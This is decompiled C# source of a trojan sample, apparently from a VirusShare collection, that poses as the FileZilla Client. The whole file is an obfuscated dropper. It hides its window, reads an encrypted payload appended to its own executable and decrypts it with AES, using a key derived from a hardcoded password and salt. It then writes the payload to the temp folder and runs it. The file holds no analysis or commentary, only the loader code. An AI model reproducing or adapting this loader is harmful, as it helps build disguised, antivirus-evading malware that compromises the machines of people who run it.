// Decompiled with JetBrains decompiler
// Type: .
// Assembly: FileZilla Client, Version=3.5.3.0, Culture=neutral, PublicKeyToken=null
// MVID: B794D7B0-77D8-4DB9-A117-32697E11C530
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.Win32.Llac.coih-d4a46fe8e815224c23e37613278718e055c3b6df9e98f5bf6e3c86f949db54e3.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace \u0005
{
  [DesignerGenerated]
  internal class \u0001 : Form
  {
    private static List<WeakReference> \u0001 = new List<WeakReference>();
    private IContainer \u0001;
    private string \u0001;
    private string \u0002;

    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.NoInlining)]
    static \u0001()
    {
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public \u0001()
    {
      this.Load += new EventHandler(this.\u0001);
      \u0005.\u0001.\u0001((object) this);
      this.\u0002 = Path.GetTempPath();
      this.\u0001();
    }

    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void \u0001(object cf6d3440c26ed201b24bdf5ca69a05849)
    {
      List<WeakReference> weakReferenceList = \u0005.\u0001.\u0001;
      bool lockTaken = false;
      try
      {
        Monitor.Enter((object) weakReferenceList, ref lockTaken);
        if (\u0005.\u0001.\u0001.Count == \u0005.\u0001.\u0001.Capacity)
        {
label_2:
          switch (4)
          {
            case 0:
              goto label_2;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0005.\u0001.\u0001);
              }
              int index1 = 0;
              int num = checked (\u0005.\u0001.\u0001.Count - 1);
              int index2 = 0;
              while (index2 <= num)
              {
                if (\u0005.\u0001.\u0001[index2].IsAlive)
                {
label_7:
                  switch (4)
                  {
                    case 0:
                      goto label_7;
                    default:
                      if (index2 != index1)
                        \u0005.\u0001.\u0001[index1] = \u0005.\u0001.\u0001[index2];
                      checked { ++index1; }
                      break;
                  }
                }
                checked { ++index2; }
              }
label_13:
              switch (5)
              {
                case 0:
                  goto label_13;
                default:
                  \u0005.\u0001.\u0001.RemoveRange(index1, checked (\u0005.\u0001.\u0001.Count - index1));
                  \u0005.\u0001.\u0001.Capacity = \u0005.\u0001.\u0001.Count;
                  break;
              }
              break;
          }
        }
        \u0005.\u0001.\u0001.Add(new WeakReference(RuntimeHelpers.GetObjectValue(cf6d3440c26ed201b24bdf5ca69a05849)));
      }
      finally
      {
        if (lockTaken)
        {
label_17:
          switch (1)
          {
            case 0:
              goto label_17;
            default:
              Monitor.Exit((object) weakReferenceList);
              break;
          }
        }
      }
    }

    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.NoInlining)]
    void Form.\u0001(bool c7cae18d837441487b111e674acd16751)
    {
      try
      {
        int num;
        if (c7cae18d837441487b111e674acd16751)
        {
label_2:
          switch (3)
          {
            case 0:
              goto label_2;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0005.\u0001.\u0001);
              }
              if (this.\u0001 != null)
              {
                num = 1;
                goto label_8;
              }
              else
                break;
          }
        }
        num = 0;
label_8:
        if (num == 0)
          return;
label_9:
        switch (1)
        {
          case 0:
            goto label_9;
          default:
            this.\u0001.Dispose();
            break;
        }
      }
      finally
      {
        // ISSUE: explicit non-virtual call
        __nonvirtual (((Form) this).Dispose(c7cae18d837441487b111e674acd16751));
      }
    }

    [DebuggerStepThrough]
    [MethodImpl(MethodImplOptions.NoInlining)]
    private void \u0001()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(116, 0);
      this.Name = \u0001.\u0005.\u0001(190);
      this.Text = \u0001.\u0005.\u0001(204);
      this.ResumeLayout(false);
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void \u0001(
      object cf6d3440c26ed201b24bdf5ca69a05849_1,
      EventArgs cf6d3440c26ed201b24bdf5ca69a05849_2)
    {
      try
      {
        this.Hide();
        this.Visible = false;
        string password = \u0001.\u0005.\u0001(218);
        string Delimiter = \u0001.\u0005.\u0001(274);
        FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
        this.\u0001 = Strings.Space(checked ((int) FileSystem.LOF(1)));
        FileSystem.FileGet(1, ref this.\u0001);
        FileSystem.FileClose(1);
        string s = Strings.Split(this.\u0001, Delimiter)[1];
        RijndaelManaged rijndaelManaged = new RijndaelManaged();
        byte[] salt = new byte[8]
        {
          (byte) 12,
          (byte) 23,
          (byte) 34,
          (byte) 45,
          (byte) 56,
          (byte) 67,
          (byte) 78,
          (byte) 89
        };
        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, salt);
        rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
        rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
        MemoryStream memoryStream = new MemoryStream();
        CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
        try
        {
          byte[] buffer = Convert.FromBase64String(s);
          cryptoStream.Write(buffer, 0, buffer.Length);
          cryptoStream.Close();
          s = Encoding.UTF8.GetString(memoryStream.ToArray());
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        FileSystem.FileOpen(1, this.\u0002 + \u0001.\u0005.\u0001(330), OpenMode.Binary);
        FileSystem.FilePut(1, s, -1L, false);
        FileSystem.FileClose(1);
        Interaction.Shell(this.\u0002 + \u0001.\u0005.\u0001(392), AppWinStyle.NormalFocus);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      this.Close();
    }
  }
}
